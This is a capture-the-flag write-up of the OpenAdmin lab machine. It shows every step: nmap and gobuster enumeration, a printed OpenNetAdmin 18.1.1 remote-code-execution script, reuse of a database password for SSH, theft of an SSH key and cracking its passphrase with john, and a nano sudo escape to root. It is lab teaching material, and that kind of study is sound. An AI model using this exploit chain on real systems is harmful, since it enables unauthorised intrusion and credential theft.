# OpenAdmin

## OpenAdmin

Openadmin was an easy linux box which required a bit of enumeration to find the vulnerable service OpenNetAdmin running on http and we then exploit it to get a shell. After that we priv esc to a user jimmy and after that te user joanna. Root was a simple GTFO bins search which used the text editor nano to get a root shell.

> Skills involved in this box:
>
> * enumeration
> * exploitation
> * further enumeration of files lon target system
> * privelage escalation x 3

## USER

> Nmap

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Our nmap reveals just 2 ports open being 22 on ssh and 80 on http.

When we check out the web page it just reveals the standard apache page.

We will use gobuster to check for hidden directories to see if we can find anything.

```bash
kali@kali:~/boxes/openadmin$ gobuster dir -u http://10.10.10.171/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.171/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/06/13 04:20:40 Starting gobuster
===============================================================
/music (Status: 301)
/artwork (Status: 301)
/sierra (Status: 301)
/server-status (Status: 403)
```

It reveals a few dirs which are irelevant the one we are interested in is `/music`.

Navigating to music we check out everything on the website but we get a redirect to another site when we click on the `login` section on the site called `/ona`

This takes us to a site that we can see is running OpenNetAdmin which conveneiently has an exploit on exploit-db

We can see on the page that the version is `18.1.1` so we run `searchsploit` on this

```bash
kali@kali:~$ searchsploit OpenNetAdmin 18.1.1
---------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                        |  Path
---------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)                                                          | php/webapps/47772.rb
OpenNetAdmin 18.1.1 - Remote Code Execution                                                                           | php/webapps/47691.sh
---------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

We will attempt to use the .sh file for the exploit, This is the exploit:

```bash
URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
```

We run it with `./exploit.sh http://10.10.10.171/ona/login.php` and get a shell as www-data!

```bash
kali@kali:~/boxes/openadmin$ ./exploit.sh http://10.10.10.171/ona/login.php
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ whoami
www-data
$ ls
config
config_dnld.php
dcm.php
images
include
index.php
local
login.php
logout.php
modules
plugins
winc
workspace_plugins
$ cd local
$ ls
config
config_dnld.php
dcm.php
images
include
index.php
local
login.php
logout.php
modules
plugins
winc
workspace_plugins
$ ls local/config
database_settings.inc.php
motd.txt.example
run_installer
$ cat /local/config/database_settings.inc.php
$ cat local/config/database_settings.inc.php 
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
```

Reading this file we find a password but we cant tell for what user its for.

We use ls to list the contents of the directories as we cannot use `cd` in the restricted shell.

We read the /etc/passwd file to get a list of users and we find that there is a user called `jimmy` on the box.

We ssh as jimmy into the box \| `ssh jimmy@10.10.10.171` and use the password `n1nj4W4rri0R!`

We then go to enumerate folders and files and after a while we come accross a `main.php` file in `/var/www/internal`:

```php
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

It seems to be reading the ssh key for joanna which is another user on the box, We realise that the method to privelage escalate on this box is going to be through this web page to get the ssh-key.

We try `curl http://127.0.0.1/main.php` but we get a 404 error which is interesting the main.php is definetely a file.

We run `netstat -tupln` to see if any other ports are running and indeed there are.

```bash
jimmy@openadmin:/var/www/internal$ netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
```

We see that there are ports 3306 and 52846 running on locahost, we will try now read the file through the open ports, port 3306 doesnt work but port 52846 does infact work and we succesfully read joannas ssh key.

```bash
jimmy@openadmin:/var/www/internal$ curl http://127.0.0.1:52846/main.php
<pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
</pre><html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

After getting the key we of course try copying it to our box and ssh as joanna but it asks for a passphrase and we dont have one so we must try and get one.

We use ssh2john.py to convert the ssh key to a hash so that we can try and extract a passphrase from it using john. `./ssh2john.py id_rsa > hash.txt`

```bash
kali@kali:~/boxes/openadmin$ sudo john -w=/home/kali/rockyou.txt hash.txt
[sudo] password for kali: 
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (id_rsa)
1g 0:00:00:05 DONE (2020-06-13 04:54) 0.1672g/s 2398Kp/s 2398Kc/s 2398KC/sa6_123..*7¡Vamos!
Session completed
```

So we now have the password `bloodninjas`.

We give the rsa file appropriate permissions with `chmod 400 id_rsa` and then we ssh into the box as joanna and read our user flag.

```bash
kali@kali:~/boxes/openadmin# ssh -i id_rsa joanna@10.10.10.171
Enter passphrase for key 'id_rsa': 

joanna@openadmin:~$ cat user.txt
c9b2cf07d[...]
```

## ROOT

We run `sudo -l` as always when we are trying to priv esc to see if we can run anything as sudo.

```bash
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

In fact we can run something, we can use the text editor nano as root on teh file /opt/priv

We go on [https://gtfobins.github.io/gtfobins/nano/](https://gtfobins.github.io/gtfobins/nano/) and read teh section on shell.

```bash
nano
^R^X
reset; sh 1>&0 2>&0
```

There are two ways of doing it from here.

1. We can either use nano on the file then `^R` and then simply type `/root/root.txt` and teh flag pops up.
2. Or we can get a shell by doing the above command involving `reset`.

   ```bash
   Command to execute: reset; sh 1>&0 2>&0# ls                                                                                                                                                                                                
   user.txtelp                                                                                                          ^X Read File
   # cd root                                                                                                            M-F New Buffer
   sh: 2: cd: can't cd to root
   # cd /root
   # ls
   root.txt
   # type root.txt
   root.txt: not found
   # cat root.txt
   2f907ed450b361b2c2bf4e8795d5b561
   ```

   Thanks for reading hope you enjoyed.

